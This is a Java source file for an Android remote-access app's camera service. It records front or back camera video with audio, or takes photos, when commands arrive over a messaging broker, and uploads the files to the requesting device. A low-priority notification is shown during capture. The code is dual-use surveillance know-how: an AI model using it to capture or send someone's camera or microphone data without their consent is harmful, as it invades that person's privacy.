package com.droid.remoteaccess.recorder;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.preference.PreferenceManager;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import com.droid.remoteaccess.R;
import com.droid.remoteaccess.feature.Constantes;
import com.droid.remoteaccess.others.Methods;
import com.droid.remoteaccess.services.BrokerMessaging;
import com.droid.remoteaccess.services.FileTransferHelper;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

public class DroidCameraCaptureService extends Service {

    private static final String TAG = "DroidCameraCapture";
    private static final String CHANNEL_ID = "camera_capture";
    private static final int NOTIFICATION_ID = 1003;
    private static final String CAMERA_FOLDER = "RemoteAccessCamera";
    private static final int VIDEO_MAX_WIDTH = 640;
    private static final int VIDEO_MAX_HEIGHT = 480;
    private static final int VIDEO_BIT_RATE = 450000;
    private static final int VIDEO_FRAME_RATE = 15;
    private static final long VIDEO_5_SECONDS_MS = 5000;
    private static final String PREF_LAST_VIDEO_FILE = "last_front_video_file";
    private static final String PREF_LAST_PHOTO_FILE = "last_front_photo_file";

    private HandlerThread cameraThread;
    private Handler cameraHandler;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private MediaRecorder mediaRecorder;
    private ImageReader imageReader;
    private File currentVideoFile;
    private File currentPhotoFile;
    private boolean recording;
    private Intent activeRequestIntent;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(final Intent intent, int flags, final int startId) {
        if (intent == null) {
            stopSelf(startId);
            return START_NOT_STICKY;
        }

        final String command = intent.getStringExtra(Constantes.CHAMADAPORCOMANDOTEXTO);
        if (command == null || command.isEmpty()) {
            stopSelf(startId);
            return START_NOT_STICKY;
        }

        activeRequestIntent = intent;
        if (!startCameraForeground(command)) {
            sendCameraCommandResponse(intent, getStartErrorResponse(command));
            stopSelf(startId);
            return START_NOT_STICKY;
        }

        ensureCameraThread();
        cameraHandler.post(new Runnable() {
            @Override
            public void run() {
                if (isAutoVideoCommand(command)) {
                    startVideo(intent, true, true, VIDEO_5_SECONDS_MS, getCameraFacing(command), startId);
                } else if ("vr".equalsIgnoreCase(command)) {
                    startVideo(intent, false, false, 0, CameraCharacteristics.LENS_FACING_FRONT, startId);
                } else if ("vs".equalsIgnoreCase(command)) {
                    stopFrontVideo(intent, startId);
                } else if (isPhotoCommand(command)) {
                    takePhoto(intent, startId, getCameraFacing(command));
                } else {
                    sendCameraCommandResponse(intent, "r:" + command + ":error");
                    finishIfIdle(startId);
                }
            }
        });

        return START_STICKY;
    }

    private String getStartErrorResponse(String command) {
        if (isAutoVideoCommand(command)) {
            return "r:uv:error";
        }
        if (isPhotoCommand(command)) {
            return "r:up:error";
        }
        return "r:" + command + ":error";
    }

    private boolean isAutoVideoCommand(String command) {
        return "vr5".equalsIgnoreCase(command)
                || "vf5".equalsIgnoreCase(command)
                || "vb5".equalsIgnoreCase(command);
    }

    private boolean isPhotoCommand(String command) {
        return "pr".equalsIgnoreCase(command)
                || "pf".equalsIgnoreCase(command)
                || "pb".equalsIgnoreCase(command);
    }

    private int getCameraFacing(String command) {
        if ("vb5".equalsIgnoreCase(command) || "pb".equalsIgnoreCase(command)) {
            return CameraCharacteristics.LENS_FACING_BACK;
        }
        return CameraCharacteristics.LENS_FACING_FRONT;
    }

    private void startVideo(final Intent requestIntent, final boolean timed, final boolean autoUpload,
                            final long durationMs, final int cameraFacing, final int startId) {
        if (!hasVideoPermissions()) {
            sendCameraCommandResponse(requestIntent, autoUpload ? "r:uv:error" : "r:vr:error");
            finishIfIdle(startId);
            return;
        }
        if (recording) {
            sendCameraCommandResponse(requestIntent, timed ? "r:uv:error" : "r:vr:recording");
            finishIfIdle(startId);
            return;
        }

        try {
            final CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            final String cameraId = findCameraId(cameraManager, cameraFacing);
            if (cameraId == null) {
                sendCameraCommandResponse(requestIntent, autoUpload ? "r:uv:error" : "r:vr:error");
                finishIfIdle(startId);
                return;
            }

            Size videoSize = chooseVideoSize(cameraManager, cameraId);
            currentVideoFile = buildOutputFile(cameraFacing == CameraCharacteristics.LENS_FACING_BACK ? "video_traseiro_" : "video_frontal_", ".mp4");
            mediaRecorder = createVideoRecorder(currentVideoFile, videoSize, getSensorOrientation(cameraManager, cameraId));

            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    try {
                        final Surface recorderSurface = mediaRecorder.getSurface();
                        final CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
                        builder.addTarget(recorderSurface);
                        cameraDevice.createCaptureSession(Collections.singletonList(recorderSurface),
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(@NonNull CameraCaptureSession session) {
                                        captureSession = session;
                                        try {
                                            builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                                            captureSession.setRepeatingRequest(builder.build(), null, cameraHandler);
                                            mediaRecorder.start();
                                            recording = true;
                                            saveLatestFile(PREF_LAST_VIDEO_FILE, currentVideoFile);
                                            Log.i(TAG, "Front video recording started: " + currentVideoFile.getAbsolutePath());
                                            if (timed) {
                                                scheduleTimedVideoStop(requestIntent, startId, durationMs, autoUpload);
                                            } else {
                                                sendCameraCommandResponse(requestIntent, "r:vr:recording");
                                            }
                                        } catch (Exception ex) {
                                            Log.e(TAG, "Failed to start front video capture", ex);
                                            releaseVideoResources(false);
                                            sendCameraCommandResponse(requestIntent, autoUpload ? "r:uv:error" : "r:vr:error");
                                            finishIfIdle(startId);
                                        }
                                    }

                                    @Override
                                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                        Log.e(TAG, "Failed to configure front video capture session");
                                        releaseVideoResources(false);
                                        sendCameraCommandResponse(requestIntent, autoUpload ? "r:uv:error" : "r:vr:error");
                                        finishIfIdle(startId);
                                    }
                                }, cameraHandler);
                    } catch (Exception ex) {
                        Log.e(TAG, "Failed to prepare front video session", ex);
                        releaseVideoResources(false);
                        sendCameraCommandResponse(requestIntent, autoUpload ? "r:uv:error" : "r:vr:error");
                        finishIfIdle(startId);
                    }
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    Log.w(TAG, "Front camera disconnected during video");
                    releaseVideoResources(false);
                    sendCameraCommandResponse(requestIntent, autoUpload ? "r:uv:error" : "r:vr:error");
                    finishIfIdle(startId);
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    Log.e(TAG, "Front camera error during video: " + error);
                    releaseVideoResources(false);
                    sendCameraCommandResponse(requestIntent, autoUpload ? "r:uv:error" : "r:vr:error");
                    finishIfIdle(startId);
                }
            }, cameraHandler);
        } catch (Exception ex) {
            Log.e(TAG, "Failed to open front camera for video", ex);
            releaseVideoResources(false);
            sendCameraCommandResponse(requestIntent, autoUpload ? "r:uv:error" : "r:vr:error");
            finishIfIdle(startId);
        }
    }

    private void stopFrontVideo(Intent requestIntent, int startId) {
        stopFrontVideo(requestIntent, startId, "r:vs:stopped", "r:vs:idle", "r:vs:error");
    }

    private void scheduleTimedVideoStop(final Intent requestIntent, final int startId, long durationMs, final boolean autoUpload) {
        cameraHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (autoUpload) {
                    stopAutoUploadVideo(requestIntent, startId);
                } else {
                    stopFrontVideo(requestIntent, startId, "r:vr:ready", "r:vr:error", "r:vr:error");
                }
            }
        }, durationMs);
    }

    private void stopAutoUploadVideo(Intent requestIntent, int startId) {
        boolean stopped = stopFrontVideoFileOnly();
        if (stopped) {
            boolean uploaded = uploadLatestVideo(requestIntent);
            sendCameraCommandResponse(requestIntent, uploaded ? "r:uv:sent" : "r:uv:error");
        } else {
            sendCameraCommandResponse(requestIntent, "r:uv:error");
        }
        finishIfIdle(startId);
    }

    private void stopFrontVideo(Intent requestIntent, int startId, String successResponse, String idleResponse, String errorResponse) {
        if (!recording || mediaRecorder == null) {
            releaseVideoResources(false);
            sendCameraCommandResponse(requestIntent, idleResponse);
            finishIfIdle(startId);
            return;
        }
        boolean stopped = stopFrontVideoFileOnly();
        sendCameraCommandResponse(requestIntent, stopped ? successResponse : errorResponse);
        finishIfIdle(startId);
    }

    private boolean stopFrontVideoFileOnly() {
        if (!recording || mediaRecorder == null) {
            releaseVideoResources(false);
            return false;
        }

        boolean stopped = false;
        try {
            if (captureSession != null) {
                captureSession.stopRepeating();
                captureSession.abortCaptures();
            }
            mediaRecorder.stop();
            stopped = currentVideoFile != null && currentVideoFile.exists() && currentVideoFile.length() > 0;
            Log.i(TAG, "Front video recording stopped: " + (currentVideoFile == null ? "" : currentVideoFile.getAbsolutePath()));
        } catch (Exception ex) {
            Log.e(TAG, "Failed to stop front video recording", ex);
        } finally {
            releaseVideoResources(stopped);
        }
        return stopped;
    }

    private void takePhoto(final Intent requestIntent, final int startId, final int cameraFacing) {
        if (!hasCameraPermission() || recording) {
            sendCameraCommandResponse(requestIntent, "r:up:error");
            finishIfIdle(startId);
            return;
        }

        try {
            final CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            final String cameraId = findCameraId(cameraManager, cameraFacing);
            if (cameraId == null) {
                sendCameraCommandResponse(requestIntent, "r:up:error");
                finishIfIdle(startId);
                return;
            }

            Size photoSize = choosePhotoSize(cameraManager, cameraId);
            currentPhotoFile = buildOutputFile(cameraFacing == CameraCharacteristics.LENS_FACING_BACK ? "foto_traseira_" : "foto_frontal_", ".jpg");
            imageReader = ImageReader.newInstance(photoSize.getWidth(), photoSize.getHeight(), ImageFormat.JPEG, 1);
            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    boolean saved = saveNextImage(reader, currentPhotoFile);
                    if (saved) {
                        saveLatestFile(PREF_LAST_PHOTO_FILE, currentPhotoFile);
                        Log.i(TAG, "Front photo captured: " + currentPhotoFile.getAbsolutePath());
                    }
                    releasePhotoResources();
                    if (saved) {
                        boolean uploaded = uploadLatestPhoto(requestIntent);
                        sendCameraCommandResponse(requestIntent, uploaded ? "r:up:sent" : "r:up:error");
                    } else {
                        sendCameraCommandResponse(requestIntent, "r:up:error");
                    }
                    finishIfIdle(startId);
                }
            }, cameraHandler);

            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    try {
                        cameraDevice.createCaptureSession(Collections.singletonList(imageReader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(@NonNull CameraCaptureSession session) {
                                        captureSession = session;
                                        try {
                                            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                            builder.addTarget(imageReader.getSurface());
                                            builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                                            builder.set(CaptureRequest.JPEG_ORIENTATION, getSensorOrientation(cameraManager, cameraId));
                                            captureSession.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                                                @Override
                                                public void onCaptureCompleted(@NonNull CameraCaptureSession session,
                                                                               @NonNull CaptureRequest request,
                                                                               @NonNull TotalCaptureResult result) {
                                                    Log.i(TAG, "Front photo capture completed");
                                                }
                                            }, cameraHandler);
                                        } catch (Exception ex) {
                                            Log.e(TAG, "Failed to capture front photo", ex);
                                            releasePhotoResources();
                                            sendCameraCommandResponse(requestIntent, "r:up:error");
                                            finishIfIdle(startId);
                                        }
                                    }

                                    @Override
                                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                        Log.e(TAG, "Failed to configure front photo session");
                                        releasePhotoResources();
                                        sendCameraCommandResponse(requestIntent, "r:up:error");
                                        finishIfIdle(startId);
                                    }
                                }, cameraHandler);
                    } catch (Exception ex) {
                        Log.e(TAG, "Failed to prepare front photo session", ex);
                        releasePhotoResources();
                        sendCameraCommandResponse(requestIntent, "r:up:error");
                        finishIfIdle(startId);
                    }
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    Log.w(TAG, "Front camera disconnected during photo");
                    releasePhotoResources();
                    sendCameraCommandResponse(requestIntent, "r:up:error");
                    finishIfIdle(startId);
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    Log.e(TAG, "Front camera error during photo: " + error);
                    releasePhotoResources();
                    sendCameraCommandResponse(requestIntent, "r:up:error");
                    finishIfIdle(startId);
                }
            }, cameraHandler);
        } catch (Exception ex) {
            Log.e(TAG, "Failed to open front camera for photo", ex);
            releasePhotoResources();
            sendCameraCommandResponse(requestIntent, "r:up:error");
            finishIfIdle(startId);
        }
    }

    private MediaRecorder createVideoRecorder(File outputFile, Size videoSize, int orientation) throws Exception {
        MediaRecorder recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setOutputFile(outputFile.getAbsolutePath());
        recorder.setAudioEncodingBitRate(64000);
        recorder.setAudioSamplingRate(44100);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setVideoEncodingBitRate(VIDEO_BIT_RATE);
        recorder.setVideoFrameRate(VIDEO_FRAME_RATE);
        recorder.setVideoSize(videoSize.getWidth(), videoSize.getHeight());
        recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        recorder.setOrientationHint(orientation);
        recorder.prepare();
        return recorder;
    }

    private boolean saveNextImage(ImageReader reader, File outputFile) {
        Image image = null;
        FileOutputStream outputStream = null;
        try {
            image = reader.acquireNextImage();
            if (image == null) {
                return false;
            }
            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buffer.remaining()];
            buffer.get(bytes);
            outputStream = new FileOutputStream(outputFile);
            outputStream.write(bytes);
            return outputFile.exists() && outputFile.length() > 0;
        } catch (Exception ex) {
            Log.e(TAG, "Failed to save front photo", ex);
            return false;
        } finally {
            if (image != null) {
                image.close();
            }
            if (outputStream != null) {
                try {
                    outputStream.close();
                } catch (Exception ignored) {
                }
            }
        }
    }

    private boolean startCameraForeground(String command) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(
                        CHANNEL_ID,
                        getString(R.string.remote_camera_capture_channel),
                        NotificationManager.IMPORTANCE_LOW);
                NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                if (manager != null) {
                    manager.createNotificationChannel(channel);
                }
            }

            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setSmallIcon(R.drawable.ic_stat_remote_access)
                    .setContentTitle(getString(R.string.remote_camera_capture_title))
                    .setContentText(getString(R.string.remote_camera_capture_text))
                    .setOngoing(true)
                    .setOnlyAlertOnce(true)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .build();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
                if (isAutoVideoCommand(command) || "vr".equalsIgnoreCase(command) || "vs".equalsIgnoreCase(command)) {
                    serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
                }
                startForeground(NOTIFICATION_ID, notification, serviceType);
            } else {
                startForeground(NOTIFICATION_ID, notification);
            }
            return true;
        } catch (Exception ex) {
            Log.e(TAG, "Failed to start foreground camera service", ex);
            return false;
        }
    }

    private void stopCameraForeground() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(STOP_FOREGROUND_REMOVE);
            } else {
                stopForeground(true);
            }
        } catch (Exception ex) {
            Log.w(TAG, "Failed to stop foreground camera service", ex);
        }
    }

    private boolean hasCameraPermission() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasVideoPermissions() {
        return hasCameraPermission()
                && ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
    }

    private void ensureCameraThread() {
        if (cameraThread != null && cameraThread.isAlive()) {
            return;
        }
        cameraThread = new HandlerThread("DroidFrontCamera");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());
    }

    private void stopCameraThread() {
        if (cameraThread == null) {
            return;
        }
        cameraThread.quitSafely();
        try {
            cameraThread.join(1500);
        } catch (InterruptedException ignored) {
        }
        cameraThread = null;
        cameraHandler = null;
    }

    @Nullable
    private String findCameraId(CameraManager cameraManager, int lensFacing) throws CameraAccessException {
        if (cameraManager == null) {
            return null;
        }
        for (String cameraId : cameraManager.getCameraIdList()) {
            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
            Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
            if (facing != null && facing == lensFacing) {
                return cameraId;
            }
        }
        return null;
    }

    private boolean uploadLatestVideo(Intent requestIntent) {
        String responseToken = requestIntent.getStringExtra(Constantes.REPLY_TOKEN);
        String requesterId = requestIntent.getStringExtra(Constantes.ID_FROM);
        String requesterDevice = requestIntent.getStringExtra(Constantes.DEVICE_FROM);
        String commandId = requestIntent.getStringExtra(Constantes.COMMAND_ID);
        return FileTransferHelper.uploadLatestVideo(getApplicationContext(), responseToken,
                requesterId, requesterDevice, commandId);
    }

    private boolean uploadLatestPhoto(Intent requestIntent) {
        String responseToken = requestIntent.getStringExtra(Constantes.REPLY_TOKEN);
        String requesterId = requestIntent.getStringExtra(Constantes.ID_FROM);
        String requesterDevice = requestIntent.getStringExtra(Constantes.DEVICE_FROM);
        String commandId = requestIntent.getStringExtra(Constantes.COMMAND_ID);
        return FileTransferHelper.uploadLatestPhoto(getApplicationContext(), responseToken,
                requesterId, requesterDevice, commandId);
    }

    private int getSensorOrientation(CameraManager cameraManager, String cameraId) {
        try {
            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
            Integer orientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION);
            return orientation == null ? 270 : orientation;
        } catch (Exception ex) {
            return 270;
        }
    }

    private Size chooseVideoSize(CameraManager cameraManager, String cameraId) throws Exception {
        CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
        StreamConfigurationMap map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
        Size[] sizes = map == null ? null : map.getOutputSizes(MediaRecorder.class);
        if (sizes == null || sizes.length == 0) {
            return new Size(640, 480);
        }
        return chooseReasonableSize(Arrays.asList(sizes), VIDEO_MAX_WIDTH, VIDEO_MAX_HEIGHT);
    }

    private Size choosePhotoSize(CameraManager cameraManager, String cameraId) throws Exception {
        CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
        StreamConfigurationMap map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
        Size[] sizes = map == null ? null : map.getOutputSizes(ImageFormat.JPEG);
        if (sizes == null || sizes.length == 0) {
            return new Size(1280, 720);
        }
        return chooseReasonableSize(Arrays.asList(sizes), 1920, 1080);
    }

    private Size chooseReasonableSize(List<Size> sizes, int maxWidth, int maxHeight) {
        List<Size> candidates = new ArrayList<>();
        for (Size size : sizes) {
            if (size.getWidth() <= maxWidth && size.getHeight() <= maxHeight) {
                candidates.add(size);
            }
        }
        if (candidates.isEmpty()) {
            candidates.addAll(sizes);
        }
        return Collections.max(candidates, new Comparator<Size>() {
            @Override
            public int compare(Size left, Size right) {
                return Long.compare((long) left.getWidth() * left.getHeight(),
                        (long) right.getWidth() * right.getHeight());
            }
        });
    }

    private File buildOutputFile(String prefix, String extension) {
        File outputDir = getExternalFilesDir(android.os.Environment.DIRECTORY_MOVIES);
        if (outputDir != null) {
            outputDir = new File(outputDir, CAMERA_FOLDER);
        }
        if (outputDir == null) {
            outputDir = new File(getFilesDir(), CAMERA_FOLDER);
        }
        if (!outputDir.exists()) {
            outputDir.mkdirs();
        }
        return new File(outputDir, prefix + Methods.getDateTimeFormated() + extension);
    }

    private void saveLatestFile(String preferenceKey, File file) {
        if (file == null) {
            return;
        }
        PreferenceManager.getDefaultSharedPreferences(getApplicationContext())
                .edit()
                .putString(preferenceKey, file.getAbsolutePath())
                .apply();
    }

    @Nullable
    private static File getLatestFile(Context context, String preferenceKey, String extension) {
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext());
        String latestPath = preferences.getString(preferenceKey, "");
        if (latestPath != null && !latestPath.isEmpty()) {
            File latestFile = new File(latestPath);
            if (latestFile.exists() && latestFile.isFile() && latestFile.length() > 0) {
                return latestFile;
            }
        }

        File outputDir = context.getExternalFilesDir(android.os.Environment.DIRECTORY_MOVIES);
        if (outputDir != null) {
            outputDir = new File(outputDir, CAMERA_FOLDER);
        }
        if (outputDir == null || !outputDir.exists()) {
            outputDir = new File(context.getFilesDir(), CAMERA_FOLDER);
        }
        if (!outputDir.exists()) {
            return null;
        }

        File[] files = outputDir.listFiles();
        if (files == null) {
            return null;
        }

        File newest = null;
        for (File file : files) {
            if (file.isFile() && file.getName().endsWith(extension) && file.length() > 0) {
                if (newest == null || file.lastModified() > newest.lastModified()) {
                    newest = file;
                }
            }
        }
        return newest;
    }

    @Nullable
    public static File getLatestVideoFile(Context context) {
        return getLatestFile(context, PREF_LAST_VIDEO_FILE, ".mp4");
    }

    @Nullable
    public static File getLatestPhotoFile(Context context) {
        return getLatestFile(context, PREF_LAST_PHOTO_FILE, ".jpg");
    }

    private void releaseVideoResources(boolean keepFile) {
        recording = false;
        try {
            if (captureSession != null) {
                captureSession.close();
            }
        } catch (Exception ignored) {
        }
        captureSession = null;

        try {
            if (mediaRecorder != null) {
                mediaRecorder.reset();
                mediaRecorder.release();
            }
        } catch (Exception ignored) {
        }
        mediaRecorder = null;

        closeCamera();

        if (!keepFile && currentVideoFile != null && currentVideoFile.exists()) {
            currentVideoFile.delete();
        }
    }

    private void releasePhotoResources() {
        try {
            if (captureSession != null) {
                captureSession.close();
            }
        } catch (Exception ignored) {
        }
        captureSession = null;

        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }

        closeCamera();
    }

    private void closeCamera() {
        try {
            if (cameraDevice != null) {
                cameraDevice.close();
            }
        } catch (Exception ignored) {
        }
        cameraDevice = null;
    }

    private void sendCameraCommandResponse(Intent requestIntent, String responseMessage) {
        try {
            String responseToken = requestIntent.getStringExtra(Constantes.REPLY_TOKEN);
            String requesterId = requestIntent.getStringExtra(Constantes.ID_FROM);
            String requesterDevice = requestIntent.getStringExtra(Constantes.DEVICE_FROM);
            String commandId = requestIntent.getStringExtra(Constantes.COMMAND_ID);
            if (responseToken == null || responseToken.isEmpty()) {
                Log.w(TAG, "Cannot send camera response because response token is empty: " + responseMessage);
                return;
            }

            Bundle data = new Bundle();
            data.putString(Constantes.MESSAGE, responseMessage);
            data.putString(Constantes.ID_FROM, Methods.getIDDevice(getApplicationContext()));
            data.putString(Constantes.EMAIL_FROM, Methods.getEmail(getApplicationContext()));
            data.putString(Constantes.TOKEN_FROM, BrokerMessaging.getDeviceTopic(getApplicationContext()));
            data.putString(Constantes.DEVICE_FROM, Methods.getNameDevice(getApplicationContext()));
            data.putString(Constantes.ID_TO, requesterId);
            data.putString(Constantes.DEVICE_TO, requesterDevice);
            data.putString(Constantes.COMMAND_ID, commandId);

            BrokerMessaging.publishResponse(responseToken, data);
            Log.i(TAG, "Camera command response sent: " + responseMessage);
        } catch (Exception ex) {
            Log.e(TAG, "Failed to send camera command response: " + responseMessage, ex);
        }
    }

    private void finishIfIdle(int startId) {
        if (!recording) {
            stopCameraForeground();
            stopSelf(startId);
        }
    }

    @Override
    public void onDestroy() {
        if (cameraHandler != null) {
            cameraHandler.post(new Runnable() {
                @Override
                public void run() {
                    releaseVideoResources(true);
                    releasePhotoResources();
                }
            });
        } else {
            releaseVideoResources(true);
            releasePhotoResources();
        }
        stopCameraForeground();
        stopCameraThread();
        super.onDestroy();
    }
}
